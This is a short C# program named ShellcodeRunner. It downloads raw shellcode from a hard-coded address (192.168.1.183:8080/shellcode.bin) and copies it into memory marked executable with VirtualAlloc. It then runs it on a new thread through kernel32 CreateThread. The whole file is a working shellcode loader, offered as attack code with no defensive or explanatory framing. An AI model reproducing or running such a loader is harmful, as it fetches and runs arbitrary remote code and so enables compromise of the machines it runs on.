using System;
using System.Net;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            IntPtr lpThreadId
            );

        static void Main(string[] args)
        {
            
            
            WebClient client = new WebClient();
            string url = "http://192.168.1.183:8080/shellcode.bin";
            byte[] Shellcode = client.DownloadData(url);

            IntPtr allocMemAddress = VirtualAlloc(IntPtr.Zero, (uint)Shellcode.Length, 0x00001000 | 0x00002000, 0x40);

            Marshal.Copy(Shellcode, 0, allocMemAddress, Shellcode.Length);

            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
            Console.WriteLine("Shellcode executed");
        }


        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            uint size,
            uint flAllocationType,
            uint flProtect
            );


       [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );
    }
}
